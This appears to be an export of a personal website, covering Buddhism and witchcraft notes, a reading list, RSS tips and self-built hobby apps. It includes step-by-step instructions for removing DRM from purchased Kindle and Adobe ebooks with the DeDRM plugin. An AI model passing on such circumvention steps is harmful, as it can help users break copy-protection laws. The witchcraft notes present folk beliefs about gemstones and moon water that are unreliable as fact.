1 Hello
& This is my [l:https://alastairjohnston.com/introducing-hello-pages/|hello page], where you can find how I prefer to keep in touch, and why.
- The best way to contact me is via [l:mailto:0xdstn@protonmail.com|email]. I may be a little slow to respond, as I only check that account every once in a while.
- If you need to send me an encrypted message you can download my [l:public.key|public PGP key].

- I returned to Mastodon in the end of 2022. My thoughts on this can be ready in my post [l:writing/mastodon|Return to Mastodon]. You can message me at [l:https://mastodon.spotek.io/@dustin|@dustin@mastodon.spotek.io], however I only go on there occasionally, so I may be slow to respond.

~wiki/library : Library : A list of books I've read : 2022-12-08
1 Library
& Below is a list of books I've read, separated by year. This list was created as part of my [b:2019] New Years resolution to read more. Books read before [b:2019] are listed together in the [b:Books read prior to 2019] section. I attempted to put them in order read, ascending, but those may be off. All books categorized in a year are in order of when they were read, ascending.
& The data is being populated from my [l:projects/books|book tracking] project. As of 2023, I no longer set a goal for myself so it doesn't get in the way of enjoying reading.

~wiki/buddhism : Buddhism : Notes on secular Buddhism : 2021-04-12
1 Buddhism
& These are my notes from studying and practicing [b:secular Buddhism]. Most of this was gathered while reading [l:https://www.amazon.com/dp/B07C31XJGP|No-Nonsense Buddhism for Beginners] by Noah Rasheta.
# [l:#The Four Noble Truths|The Four Noble Truths]
# [l:#The Eightfold Path|The Eightfold Path]
# [l:#The Five Aggregates|The Five Aggregates]
# [l:#The Five Precepts|The Five Precepts]
# [l:#The Three Marks of Existence|The Three Marks of Existence]
# [l:#The Three Poisons|The Three Poisons]
2 The Four Noble Truths
# [l:#Truth of Suffering|Truth of Suffering]
# [l:#Truth of the Cause of Suffering|Truth of the Cause of Suffering]
# [l:#Truth of the End of Suffering|Truth of the End of Suffering]
# [l:#Truth of the Path That Leads to the End of Suffering|Truth of the Path That Leads to the End of Suffering]
3 Truth of Suffering
& Difficulties arise and we suffer.
& Examples include sickness, old age, death, losing a job, and breaking your phone.
& Accept that suffering is part of life for everyone. There is no way around it.
3 Truth of Cause of Suffering
& The main cause of suffering is habitual reactivity.
& Suffering emerges when we want life to be different than it is.
& Our reaction causes the suffering, not the thing itself.
3 Truth of the End of Suffering
& The cessation of suffering.
& The suffering doesn't cease, but rather our craving not to suffer does.
3 Truth of the Path That Leads to the End of Suffering
& The Eightfold Path.
& The path of liberation.
& The path to the cessation of suffering.
2 The Eightfold Path
& Ways to live that lead to the end of suffering.
& There are three sections that the various points of the Eightfold Path are grouped under:
- 1-2 [b:Wisdom] (understanding, intent)
- 3-5 [b:Ethical Conduct] (speech, action, livelihood)
- 6-8 [b:Mental Discipline] (effort, mindfulness, concentration)
# [l:#Right Understanding|Right Understanding]
# [l:#Right Intent|Right Intent]
# [l:#Right Speech|Right Speech]
# [l:#Right Action|Right Action]
# [l:#Right Livelihood|Right Livelihood]
# [l:#Right Effort|Right Effort]
# [l:#Right Mindfulness|Right Mindfulness]
# [l:#Right Concentration|Right Concentration]
3 Right Understanding
& What we are seeing might not actually be what it appears to be.
& Uncertain concepts and ideas that prevent us from seeing reality as it is.
3 Right Intent
& Be aware of our intentions regarding the things we say and do.
& Intentions from anger or hatred are more likely to cause harm than intentions from happiness and gratitude.
& Behaving reactively makes it difficult to be mindful of our intentions.
3 Right Speech
& Communicating with others in a way that doesn't cause harm.
& Lying, gossiping, or insulting are not right speech.
& With right speech, you consider why you say something as much as what you say.
3 Right Action
& Doing what is proper and necessary for your situation.
& While this sometimes includes "doing the right thing" morally, it more closely resembles behaving appropriately in any situation.
3 Right Livelihood
& Livelihood is how we make a living and how we interact with others on the job.
& We need to determine if what we do is doing more harm or good for ourselves and others.
3 Right Effort
& What it takes to put into practice the other parts of the path.
& It takes effort if we want any kind of positive change in our lives.
3 Right Mindfulness
& Paying attention at all times.
& Being mindful helps us stay anchored in the present moment, which keeps us in touch with reality as it is.
3 Right Concentration
& The practice of focusing on only one thing, whatever it is we are doing.
& The opposite is distraction.
2 The Five Aggregates
& Suffering arises when one identifies with or clings to one of the aggregates.
# [l:#Form or Materiality|Form or Materiality]
# [l:#Sensation or Feeling Tone|Sensation or Feeling Tone]
# [l:#Perception|Perception]
# [l:#Mental Formation or Thought Process|Mental Formation or Thought Process]
# [l:#Consciousness or Awareness|Consciousness or Awareness]
3 Form or Materiality
& Something material that can be sensed with sight, sound, taste or touch.
3 Sensation or Feeling Tone
& The feeling state that arises when we sense something pleasant or unpleasant.
& Feeling tones can be understood as pleasure, pain, or neutrality.
3 Perception
& Recognition of a sensation we have experienced.
& Perception is giving names to something, like "scary".
3 Mental Formation or Thought Process
& Likes, dislikes, biases, and prejudices.
& Mental formations alter perception.
3 Consciousness or Awareness
& General awareness of other aggregates that make the entire experience possible.
2 The Five Precepts
& There are no moral absolutes in Buddhism, so the precepts are left to interpretation.
& These are general rules of things that are best to abstain from.
# [l:#Abstain From Taking Life|Abstain From Taking Life]
# [l:#Abstain From Taking What is Not Given|Abstain From Taking What is Not Given]
# [l:#Abstain From Sexual Misconduct|Abstain From Sexual Misconduct]
# [l:#Abstain From Incorrect Speech|Abstain From Incorrect Speech]
# [l:#Abstain From Intoxicants That Cloud The Mind|Abstain From Intoxicants That Cloud The Mind]
3 Abstain From Taking Life
& Could relate to abortion, death penalty, or killing insects.
& In order to weigh consequences of our actions, it's helpful to examine if it's motivated by greed, hatred, and delusion, or by kindness, wisdom, and compassion.
& Intent plays a key role.
3 Abstain From Taking What is Not Given
& Goes beyond stealing and includes evaluating your motivations and understanding how your actions will affect others.
3 Abstain From Sexual Misconduct
& What is considered misconduct is determined by the inherited culture and societal views.
& Non-consensual sex and sexual exploitation are misconduct.
& Examine how your actions make you feel and how it will impact others.
3 Abstain From Incorrect Speech
& Goes beyond not telling lies.
& It means speaking honestly and communicating in a way that is beneficial to others.
& Incorrect speech is rooted in the three poisons of greed, hatred, and ignorance.
& Misleading others, saying intentionally hurtful things, and gossiping are incorrect speech.
3 Abstain From Intoxicants That Cloud The Mind
& Could be alcohol, drugs, or anything that clouds the mind, or alters perception.
& Media we consume or addictive habits.
& Be cautious of distractions from reality.
2 The Three Marks of Existence
# [l:#Suffering|Suffering]
# [l:#Impermanence|Impermanence]
# [l:#Non-self|Non-self]
3 Suffering
& There are 3 types of suffering
# [b:Suffering of Suffering]<br> Natural suffering like pain.
# [b:Suffering of Loss]<br> Lose a job, a loved one, our youth. Circumstantial.
# [b:All-pervasive Suffering]<br> Self-inflicted. Arises out of an ignorant or delusional understanding of reality. Has to do with how we perceive and interpret circumstances. We self-inflict based on a belief or concept. If we didn't hold the false belief, the suffering wouldn't exist.
3 Impermanence
& All things are constantly changing. Jobs, relationships, thoughts, feelings, loved ones, ourselves, everything we know and perceive will pass out of existence.
& We know this, but we cling to things and perceive them as permanent.
& Two types of impermanence - gross and subtle.
# [b:Gross]<br> Matter decays, empires rise and fall, societal norms change and evolve.
# [b:Subtle]<br> Moment-to-moment, cells in your body die and regenerate, you are never exactly the same. We are collections of impermanent, momentary experiences.
& Loss is a natural part of life, not something we need to fight against.
3 Non-self
& You are not what you think you are, because there is no inherent essence in anything.
& Things are because of, and in relation to, other things, but do not exist on their own as permanent or separate entities.
& Everything has causes and conditions, nothing stands alone.
& There is no permanent or fixed you, just a complex web of inseparable, impermanent, causes and effects.
2 The Three Poisons
# Greed
# Hatred
# Ignorance

~wiki/witchcraft : Witchcraft : Notes related to witchcraft : 2023-05-12
1 Witchcraft
& These are my notes from studying and practicing witchcraft.
? [d:wiki/witchcraft]

~wiki/witchcraft/magic : Magic : Notes related to general magic : 2023-08-01
1 Magic
& With magic, all that matters is strength of will to bring results. If you focus intent and manipulate the energy, change will happen.
& I feel that hiding behind the witchy exterior, witchcraft is mostly being mindful and connecting with nature.
& Maybe there is no true god, but instead the universe presents itself in the form that resonates most with each individual. All gods and relgions are just nature manifesting itself in our lives.
> "That's all magic is really: The space between what you have and what you need" - Once and Future Witches
& Magic is just another force in the universe that we can tap into to help us create positive change.
& Prayers and spells have a lot in common, they are both ways of asking for help.
& The real meaning of magic is for witches to discover for themselves through experience.
> "The philosophy of witchcraft contains a choice to perceive things differently from the way most other people do." - Marion Weinstein, Personal Magic
> "Magic is transformational, brought about by will and skill in accordance with natural law." - Marion Weinstein, Personal Magic

~wiki/witchcraft/stones : Stones : Notes related to stones : 2023-08-21
1 Stones
# [l:#Gemstones|Gemstones]
# [l:#Hagstones|Hagstones]
2 Gemstones
& Carrying around or wearing specific gemstones can affect you in different ways. These are the ones I own.
- [b:Jade]: Self acceptance, inner calm, creativity
- [b:Rose Quartz]: Love
- [b:Jasper]: Grounding and centering, luck and good fortune
- [b:Tiger's Eye]: Self confidence, courage, protection
- [b:Amethyst]: Calm, balance
- [b:Obsidian]: Grounding, protection
- [b:Lapis Lazuli]: Confusion, emotional baggage
- [b:Clear Quartz]: Connection to all four elements
2 Hagstones
& Hagstones are stones found by the ocean with holes in them that you can see through. They are supposed to let positive energy through, but negative energy doesn't fit through the holes, and are used for protection.

~wiki/witchcraft/water : Water : Notes related to water : 2023-08-21
1 Water
2 Moon Water
& You can leave a container of water out on a full moon, and it will absorb energy from the moon. The moon water can be used to cleanse magical items.
& A mason jar works well as it has a lid and is transparent so the moon light can shine through the container.

~wiki/witchcraft/tarot : Tarot : Notes related to tarot : 2023-08-01
1 Tarot
& Think of tarot as a tool for self-awareness and reflection, rather than fortune telling.

~wiki/ebooks : Ebooks : Notes on managing my digital library : 2023-07-26
1 Ebooks 
& Below are my notes on managing my [b:ebooks library].
# [l:#Notes|Notes]
# [l:#Ebook management|Ebook management]
# [l:#Remove DRM|Remove DRM]
2 Notes
& I currently own a [b:10th Generation Kindle].
& It is still set up as an Amazon device, but if it becomes possible I may jailbreak it. As of writing this, [l:https://www.mobileread.com/forums/showthread.php?t=320564|these instructions] only support firmware version <= [c:5.14.2] and mine is running [c:5.16.2.1].
2 Ebook management
& Previously I would take ebooks I got outside of Amazon and import them to Amazon via their Send to Kindle feature. I then decided to take more control over my ebook files and removed them from there. 
& I now take ebooks, convert them to [b:mobi] using [l:https://calibre-ebook.com/|Calibre], and then add those mobi files to a folder on my computer and in a folder on the Kindle via USB.
2 Remove DRM
& This is the process I took to remove DRM from my books bought on Amazon and Google.
& Moving forward I will try to always purchase DRM free books. I found [l:https://www.defectivebydesign.org/guide/ebooks|this resource] which I will use to find sources for the books I want to buy.
3 Install Calibre with DeDRM
# Download and install [l:https://calibre-ebook.com/|Calibre]
# Download the latest [l:https://github.com/apprenticeharper/DeDRM_tools/releases|DeDRM_tools] and extract [c:DeDRM_plugin.zip] from it.
# In Calibre go to Preferences > Advanced > Plugins > Load plugin from file and select the [c:DeDRM_plugin.zip] file
3 Kindle
& Note: Books published after [b:January 3rd, 2023] will not download, and therefore cannot be converted. Fortunately, I only had one book that fit this as of migrating.
# Download and install [l:https://web.archive.org/web/20170111102550/https://s3.amazonaws.com/kindleforpc/44183/KindleForPC-installer-1.17.44183.exe|Kindle for Windows v1.17]
# In Kindle for Windows, log in to your Amazon account and download all the books you want to convert
# In Calibre click [b:Add Books] and navigate to the Amazon books (mine were in [c:C:\Users\USERNAME\Documents\My Kindle Content])
# In Calibre click select all the books and click [b:Convert books > bulk convert]. Select the format you want and click convert. With the plugin installed DRM should already be removed.
3 Google Books
# Go to [l:https://books.google.com/books|Google Books]
# Click on each book you want to download
# For each click on the [b:settings cog] and click [b:Download EPUB] (they will be [c:acsm] files)
# Follow the Remove DRM from ascm files below
3 Books-a-Million
# Go to [b:My Download Library] on [l:https://booksamillion.com|Books-a-Million]
# Click on [b:Download] for each book you want to download (they will be [c:acsm] files)
# Follow the Remove DRM from ascm files below
3 Remove DRM from acsm files
# Download and install [l:https://adobe.com/solutions/ebook/digital-editions/download.html|Adobe Digital Editions]
# Open Adobe Digital Editions and log in with your Adobe account
# In ADE click [b:File > Add to Library] and select the downloaded books. It will have you log in to an Adobe account. This converts the files to epub.
# In Calibre click [b:Add Books] and navigate to the ADE books (mine were in [c:C:\Users\USERNAME\Documents\My Digital Editions])
# In Calibre click select all the books and click [b:Convert books > bulk convert]. Select the format you want and click convert. With the plugin installed DRM should already be removed.

~wiki/rss : RSS : Notes on RSS : 2023-07-28
1 RSS
& As previously mentioned in my post [l:writing/social|On Social Media], my ideal form of following people is RSS. For a long while I had a ton of email newsletters filling my inbox, getting backed up, never read. I then decided to figure out how to get as many of them subscribed via RSS as I could.
& Below are the steps I took for different types of newsletters, and some notes on my RSS setup.
# [l:#Notes|Notes]
# [l:#Substack via RSS|Substack via RSS]
# [l:#Mailchimp via RSS|Mailchimp via RSS]
# [l:#Buttondown via RSS|Buttondown via RSS]
# [l:#Kill the Newsletter|Kill the Newsletter]
2 Notes
& Originally I used a RSS reader on my laptop, with the intent to open it up once a week or so and read through my subscriptions. I found that I pretty much never did that, so instead I've moved over to a [l:projects/feeds|custom RSS reader] that I built myself and host on a Raspberry Pi.
& It allows me to add feeds, pulls them down and generates local html files of the contents for each entry (via a cron job and a python script), and lists them for reading. I can mark things as read and all that as well.
& One benefit of this is it's static HTML, so I can read them on my Kindle via the web browser.
2 Substack via RSS
& It turns out Substack has RSS functionality built in, which was surprising and makes things way easier.
& I don't know how this would work with paid subscriptions, but it works for free ones. I don't pay for any to experiment with how that works, but if someone else has some info to add on it, I could put it here so feel free to [l:hello|reach out].
& To do this, log in to Substack and find the URL for each one you want to subscribe to.
& You can then add [c:/feed] to the end of the URL and add that to your RSS reader.
& For instance, if you want to subscribe to [l:https://alastairjohnston.substack.com/|Alastair Johnston's Substack], the URL would be [b:https://alastairjohnston.substack.com/feed].
2 Mailchimp via RSS
& If you subscribe to any mailchimp newsletters, [l:https://joshmuller.ca|Josh Müller] found a solution to this, which you can find on his [l:https://joshmuller.ca/writings/2023/subscribe-to-mailchimp-newsletters-with-rss/|blog post]. I'm still going to write down the gist of it here for my own future reference.
& Mailchimp signups are via the domain [b:list-manage.com]. Find the sign up URL for the newsletter you want to subscribe to.
& For example this is [l:https://www.rob-sheridan.com/|Rob Sheridan's]:
& https://rob-sheridan.[b:us7].list-manage.com/subscribe?u=[b:f0b63d0d9423f2d6bdaaa481b]&id=[b:ab92894a0b]
& You can use the bolded elements to craft a URL for an RSS feed. Here is the RSS feed for Rob Sheridan:
& https://[b:us7].campaign-archive.com/feed?u=[b:f0b63d0d9423f2d6bdaaa481b]&id=[b:ab92894a0b]
2 Buttondown via RSS
& I follow one newsletter that is managed in Buttondown, however they appear to not have RSS enabled, but I've found others that do.
& To check, find the URL of the newsletter, such as [b:https://buttondown.email/drmohundro] and add [c:/rss] to the end like so:
> https://buttondown.email/drmohundro/rss
& If it loads a feed, it's enabled, otherwise it will not work and you have to use [b:Kill the Newsletter].
2 Kill the Newsletter
& For newsletters that I could not find a way to get a feed for (such as TinyLetter and custom newsletter solutions), I am using [l:https://kill-the-newsletter.com/|Kill the Newsletter].
& The way it works is you set up a mailbox and it gives you an email address to sign up for the newsletter with, and also an RSS feed URL for subscribing.
& You just give it a name for the mailbox and it generates those for you. You can then take the email and sign up for the newsletter as you normally would, and subscribe to the feed via an RSS reader.
& If you have to confirm your email, that will come through as an entry in the feed so you can click the link.

1 Vegan Pumpkin Spice Sauce
& I wanted  to make a vegan and sugar free sauce for pumpkin spice lattes and ended up with this. If you don't want to use the monk fruit sweetener, you could sub in any sweetener you like, even regular sugar.

~projects/index : Projects : My various personal projects : 2022-05-19
1 Projects
& Below is a list of personal projects I've created. Most of them are tools I have made for myself that others can use as well.
? [d:projects]

~projects/reader : Reader : An article saving/reading app : 2023-08-03
1 Reader
& I decided to move away from Pocket for saving articles to read later, and instead build my own little app. This is by no means top quality coding, it was thrown together to solve a problem.
& This requires PHP and python to run.
& [b:Source code:] [l:https://github.com/0xdstn/reader]
2 Setup
& Place the contents of the repo in a directory called [b:reader] inside your root web directory (such as [b:/var/www/html/reader]).
& Create a [c:key.txt] file one directory up from your root web directory (such as [b:/var/www]). [i:This should not be accessible via a browser.]
& Create an [c:articles] directory in the reader directory.
& Create a [c:data.txt] file in the reader directory.
& Set up a cron job for the scraper. I have it set up to run every hour like so:
% 0 * * * * cd /var/www/html/reader && ./scrape.py >/dev/null 2>&1
& The cron job takes any URL that hasn't been scraped in [c:data.txt], pulls the title and the contents for it via web scraping, updates [c:data.txt] with the title, and generates an HTML file of the contents in the [c:articles] directory.
2 Pocket import
& I transitioned from Pocket to this, so I made a pocket import script. 
& To use it, go to Pocket and export your links as an HTML file. Place that in the reader directory. It should be called [c:ril_export.html].
& You then should just need to run the [c:pocket-import.py] file and it will convert the HTML export into entries in [c:data.txt].
2 Usage
& Navigating to the [b:/reader?key=YOURKEY] directory on your webserver will display a list of articles from [c:data.txt]. Replace [b:YOURKEY] with the contents of the [c:key.txt] file. If the title has been scraped it will display that and link to the local HTML file for it. If it has not yet been scraped, it will display the URL and link out to that.
& You can click [b:Add article], which will give you a box to fill in a URL and a submit button. This adds the provided URL to [c:data.txt].
& When reading a local HTML article, there is a [b:mark read] link at the top and bottom which you can click to mark it as read, removing it from the list on the index page.
& This app is really light weight, so it works well in the web browser of a kindle.

& I previously decided to use an app on my computer to subscribe to RSS feeds with the intent of logging on once a week or so to read any posts. I kept not doing this, so I decided to create my own tool. This is a feed reader that generates HTML files of the post contents.
& This is by no means top quality coding, it was thrown together to solve a problem.
& This requires PHP and python to run.
& [b:Source code:] [l:https://github.com/0xdstn/feeds]
2 Setup
& Place the contents of the repo in a directory called [b:feeds] inside your root web directory (such as [b:/var/www/html/feeds]).
& Create a [c:key.txt] file one directory up from your root web directory (such as [b:/var/www]). [i:This should not be accessible via a browser.]
& Create an [c:articles] directory in the feeds directory.
& Create a [c:data.txt] file and a [c:feeds.txt] file in the feeds directory.
& Set up a cron job for the scraper. I have it set up to run every hour like so:
% 0 * * * * cd /var/www/html/feeds && ./scrape.py >/dev/null 2>&1
& The cron job loops through and pulls the feeds in [c:feeds.txt], adds it to the list in [c:data.txt], and generates an HTML file of the contents in the [c:articles] directory.
2 Usage
& Navigating to the [b:/feeds?key=YOURKEY] directory on your webserver will display a list of articles from [c:data.txt]. Replace [b:YOURKEY] with the contents of the [c:key.txt] file. If the articles have been added, it will display the titles and link to the local HTML file for it.
& You can subscribe to a feed by clicking [b:Add feed], which will give you a box to fill in a URL and a submit button. This adds the provided URL to [c:feeds.txt].
& When reading an article, there is a [b:mark read] link at the top and bottom which you can click to mark it as read, removing it from the list on the index page.
& This app is really light weight, so it works well in the web browser of a kindle.

~projects/meditations : Meditations :  A 5-minute journal app : 2023-07-11
1 Meditations
& I have used both the physical 5 Minute Journal and the official app on and off for a while now, but they both feel like overkill for me personally.
& I don't really need a historical record or a physical book to sit on my shelf. Looking later isn't really the point, the point is the act of writing down what you're grateful for and reflecting on your day.
& I decided to create this simple app which emulates the 5 Minute Journal app, but resets each day. No history is saved.
& It is set up as a PWA, so you can also install it to your android device and even use it offline.

~projects/traveler : The Traveler : A flat-file interactive fiction system that runs in the browser : 2023-05-09
1 The Traveler
& A flat-file interactive fiction system that runs in the browser. It is a spiritual successor to [l:projects/tilde-world|tilde world].
& If you have created world with the traveler, I'd love to see it! I could even include it in the game source for others to play if you're interested in that.
& I will probably create my own worlds at some point, which will be available to load and play.
& [b:Source code:] [l:https://github.com/0xdstn/traveler]
& [b:Live version:] [l:https://tilde.town/~dustin/traveler/]
# [l:#Description|Description]
# [l:#Game commands|Game commands]
# [l:#World creation|World creation]
# [l:#Release notes|Release notes]
2 Description
& The traveler is run from a browser using flat files. By default it'll load [l:traveler/demo.txt|demo.txt], which includes examples of all available functionality.
& You can move around from room to room, pick up objects, and interact with the NPCs and objects in the room or your inventory.
& You can also create new rooms, objects, and NPCs directly within the traveler, allowing you to create a world while inhabiting it.
& The only things you can't do from within the game is create actions or variables.
& There is a very basic variable and action system which allows a more rich interaction with NPCs and objects.
& The world, inventory, and current location are constantly saved to local storage, so when you come back the state persists.
& You can export the current world to a txt file, and you can import from a text file (local or remote URL). World files do not include inventory or current location, those reset upon import.
& A world can be auto imported from url by adding the [c:?load=URL] query parameter.
2 Game commands

2 World creation
& Worlds are stored in a txt file. Each element (room, object, npc) are represented by multiple lines, and all are separated by an empty line. You can view an example with all available functionality at [l:traveler/demo.txt|demo.txt].
3 Attributes
& You can set the following attributes on an element, using a specific starting glyph for each:
% + Name
% & Description
% @ (object key) - Room only
% # (npc key) - Room only
% % (dir):(object key) - Room only, a lock with a required item for an exit (ex: % w:west-key)
% > (dir):(x),(y) - Room only, overrides an exit with the specified coordinates (ex: > n:10,10)
% ! (action) - Object and NPC only, creates an action with the provided key. Action code can be seen below
% $ (variable) = (value) - Object only, a variable for the object and it's value (ex: $ opened = false)
3 Action code
& When you set an action on an object or NPC, you can include additonal lines after it with action code that runs when the user calls the action (user example: open chest)
& The following commands are available:
- [c:ECHO (text)] - Prints out the provided text
- [c:GRAB (object)] - Adds the speicifed object to the user's inventory, even if it isn't in the room
- [c:TAKE (object)] - Removes the speicifed object from the user's inventory
- [c:SET $(variable) = (value)] - Sets the provided variable to the provided value (ex: SET $opened = true)
- [c:IF (condition)] - Starts an if block with the provided condition. Currently you can check if a variable is set to something (IF $opened = true) or if the inventory contains an item (IF INVENTORY=item1,item2)
- [c:ELSE] - Starts an else block for the current IF
- [c:ENDIF] - Ends the if/else block
& This is an example of a chest's open action. It gives the user items if it's been opened, and displays a message that it's empty when it's been opened already:
% @ chest
% + wooden chest
% & A wooden chest in questionable condition
% $ opened = false
% ! open
%   IF    $opened = true 
%   ECHO  The chest is empty
%   ELSE
%   SET   $opened = true
%   GRAB  sword
%   GRAB  shield
%   GRAB  west-key
%   ENDIF
& Here is another example of a lamp the user can turn on and off. The description can include variables that will display the value as well.
% @ lamp
% + lamp
% & An ordinary lamp with a switch. It is currently $power.
% ^ false
% $ power = on
% ! switch
%   IF    $power = on
%   SET   $power = off
%   ECHO  You turned off the lamp
%   ELSE
%   SET   $power = on
%   ECHO  You turned on the lamp
%   ENDIF
3 Rooms
& Rooms are denoted by a [c:~] followed by coordinates.
& Here is an example room with an item and a NPC. It also has a key required to go west and an override to 10,10 for the north:
& You can mention objects in the description with a leading [c:@], and NPCs with a leading [c:#].
% + Landing Room
% & An ordinary room with a @lamp and a #ghost.
% @ lamp
% # ghost
% % w:west-key
% > n:10,10
3 Objects
& Objects are denoted by a [c:@] followed by an object key
& Here is an example with no actions or variables:
% @ nintendo
% + Nintendo
% & An original Nintendo system hooked up to a CRT television.
3 NPCs
& NPCs are denoted by a [c:#] followed by an NPC key
& here is an example with a simple talk action:
% # ghost
% + Ghost
% & A spooky ghost
% ! talk
%   ECHO OOooooooooOoOoOoooohhhhhhhhh...
2 Release notes

~projects/books : Books : A text-based Goodreads alternative : 2022-12-08
1 Books
& I had been feeling that Goodreads was not the best tool for me to manage my books. Here are some of the reasons:
- It's a clunky tool that can take a lot of time to tag a bunch of books, etc
- I don't need the social aspect of it, it's just another thing I'm checking too often for no reason
- The reading goals cause me to feel I have to read when I don't want to, or to read short things just to hit the goal
- The rating and reviews didn't do much for me, so I was doing it for no reason
& I wanted a simpler solution, so I built my own. It consists of a series of text files which include:
- Year read lists (2022-read.txt, 2021-read.txt, etc)
- To read list
- Currently reading list
& There is a [b:generate.py] file which takes these in and generates the following on a site:
- A currently reading list
- Yearly read lists
- A to-read list with links for tags
- List of books for each tag
- A list of all tags with counts
& Management is simple as it's just text files of books/authors (and tags in one of them) that I can edit in vim. It doesn't do counts for the year. There are no goals. It's just a history of the books I want to read and the books I've read, which is exactly what I needed.

& The intent is to journal, but with statistics on how you were feeling that day. The goal isn't to have only positive posts, but instead to assess your mental state over time. It's up to you to determine which words are positive or negative. Sometimes the same word could even be one or the other, depending on the context. It's all about how you feel.

~projects/mastofeed : Mastofeed : A scraper+viewer for Mastodon user feeds
1 Mastofeed
& Mastofeed is a flat-file, python-based system for scraping and viewing Mastodon user posts via RSS.
& [b:Source code:] [l:https://github.com/0xdstn/mastofeed/]
# [l:#Description|Description]
# [l:#Usage|Usage]
2 Description
& Since I left Mastodon a while back in lieu of [b:RSS feeds] and [b:email] for keeping up with others and communicating, I realized I do miss out on a lot of interesting things I don't get through feeds.
& Because of this, I wanted to create a system where I could view Mastodon posts of users I care to keep up with, but not have the distraction of being on Mastodon myself. I didn't want to clutter up my RSS feed reader with Mastodon posts, so I opted to create this project instead.
& This allows me to keep up with what people are doing, but not distract me. If I want to reach out to someone based on a post, I will take the time to email them. This results in less "shallow" conversation, since more effort is required to reach out.
& This project isn't really set up to be used out of the box, but with minor modifications listed below it can be used by someone else. It was created to serve my needs, and not really meant for anyone else. That being said, if you would like to use it feel free to [l:https://github.com/0xdstn/mastofeed/|fork] it and modify it so it works better for you.
2 Usage
& You'll need to update the file paths in [b:archive.py] and [b:view.py], as I had those hard coded to my personal directories so I can alias them and not have to worry about it breaking.
& You will also need to create the following files in the root directory:
- archived.txt
- data.txt
- following.txt
& To add a Mastodon user, edit [b:following.txt] and put their account in the following format, one per line:
% username@domain.tld
& You can then manually run [c:scrape.py] to fetch posts. I set up a cron job to run it every 15 minutes.
& When [b:scrape.py] runs, it adds a post per line to the [b:data.txt] file.
& To view posts in [b:data.txt], you can run [c:view.py], which will format and output them in ascending order.
& You can either manually move posts from that file over to archive.txt so they no longer appear when running [b:view.py], or you can archive everything in [b:data.txt] by running [c:archive.py].

# [l:#Game commands|Game commands]
# [l:#Future plans|Future plans]
# [l:#Release notes|Release notes]
2 Description
& Tilde world can be run on tilde.town by running [b:~dustin/projects/tilde-world/world.py]. When you first run it it will welcome you and ask your character's name and description.
& When you finish the setup it will create a [b:~/.world] directory with some configuration files and a [b:rooms] directory where you can create your own rooms (see below).
& Your name and description is saved in [b:~/.world/config].
& When the game is looking for a room at a coordinate, it will loop through all of the users on the server and check for that coordinate in their [b:.world/rooms] directory. The first one found is used, if there are duplicates (try not to step on each other's toes please).
& Your current position is saved in [b:~/.world/loc] in the format [b:x,y].
& Your inventory is saved in [b:~/.world/inventory]. Each item goes on one line in the format [b:key : x,y]. The x,y is the room the object came from so we can reference it's data again.
& The state for props are saved in `~/.world/state`. It saves in the format [b:object_prop.txt]. As props change via user interaction, these files are updated. They are created upon entering a room with an object that has a prop.
2 Creating rooms
& You can create your own rooms by placing files in the [b:~/.world/rooms] directory.
& The files are named for their coordinates in the format [b:x_y]. Negative coordinates use an "n" instead of "-". So a room at coordinate [b:-1 0] would be a file named [b:n1_0].
& A basic room looks like this:
% NAME : Landing room
% DESC : An ordinary room
& Rooms have the following properties available:
- [c:NAME] - The name of the room
- [c:DESC] - A description of the room. This is displayed with the [b:look] command
- [c:KEY] - Optional. An ID and name of an item required to enter this room from any direction in this format: [b:west-key|West room key]
- [c:TELEPORT] - Optional. x,y coordinates to redirect the user to if they teleport here (such as the start of a dungeon).
2 Objects
& A room can contain multiple objects. A room with objects would look like this:
T NAME : Landing room
% DESC : An ordinary room
% OBJECTS
%   -
%    ID : sword
%    NAME : wooden sword
%    GRAB : true
%    DESC : A wooden sword in good condition
%  -
%    ID : shield
%    NAME : wooden shield
%    GRAB : true
%    DESC : A wooden shield in good condition
& Objects have the following properties available:
- [c:ID] - A unique identifier for referencing the object
- [c:NAME] - The name of the object
- [c:DESC] - A description of the object displayed with [b:look obj_id]. You can reference props with [propkey], and they will automatically be replaced with the value of the prop
- [c:GRAB] - (Optional, default false) [b:true] or [b:false], if the item can be picked up by a user
- [c:HIDDEN] - (Optional, default false) [b:true] or [b:false], if the item is listed in the room with the [b:look] command
- [c:ACTIONS] - (Optional) A list of actions, see below
- [c:PROPS] - (optional) A list of props, see below
2 Props and actions
& Objects can have props and actions.
& Props are key/value pairs. They will be stored in a file specific to the room/prop and the user. That means that whatever state a room and it's objects are in for one user does not affect it for another user.
& Actions are a list of triggers and a list of instructions.
& Here is an object with a prop and an action:
%   -
%    ID : lamp
%    NAME : ordinary lamp
%    GRAB : false
%    DESC : A lamp with a switch. It is currently [power].
%    PROPS
%      power=off
%    ACTIONS
%      turn|switch|push|pull
%        IF power=on
%        SET power=off
%        ECHO You turn off the lamp
%        ELSE
%        SET power=on
%        ECHO You turn on the lamp
%        ENDIF
& When the user runs [b:turn lamp] it will either turn the power prop on or off depending on if it is currently set to on or off.
2 Action instructions
& Actions currently support the following:
- [c:IF (prop)=(value)] - If prop of the item is the provided value, all following instructions until an [b:ELSE] or [b:ENDIF] will be run
- [c:IF INVENTORY=(item1,item2)] - If the inventory contains the provided item(s), all following instructions until an [b:ELSE] or [b:ENDIF] will be run
- [c:ELSE] - Placed between an [b:IF] and [b:ENDIF]. If the IF statement is false, all following instructions until an [b:ENDIF] will be run
- [c:ECHO (message)] - Prints out the provided message. Props will be replaced with their value in the format [prop]

~writing/index : Writing : Articles I've written : 2022-05-19
1 Writing 
& I write occasionally about things I care about. Below are the ones I've decided to share.
? [d:writing]

~writing/on-art : On Art : Thoughts on creating art : 2023-05-04
1 On Art
_ 2023.05.04
& I have been thinking a lot about art and how it plays a role in my life, or more so how I [i:want] it to play a role.
2 Voice
> "Your voice is formed over time through continuous experimentation and intentional practice" - Lisa Congdon
> "Your voice develops as a by-product of doing the stuff you enjoy over and over again and making discoveries" - Lisa Congdon
& Some things I've struggled with is finding my artistic voice/what kind of work I make. I've done all sorts of things like sketch journaling, nature journaling, urban sketching, character drawings, typography, etc. None of it feels like me, it just feels like I'm trying to emulate all the artists who's work I like. I feel as though I'm trying a lot of things and becoming good at none of them because of it.
& I've been reading through [b:Find Your Artistic Voice] by [i:Lisa Congdon]. I'm not done yet but I'm gathering some good advice from it:
- Trying a bunch of things is how you discover your voice. Most of it will be terrible, and that's okay.
- Focus on the things you like to do, results will emerge.
- The more drawings you make, the less you care about each one, and you'll end up taking more chances.
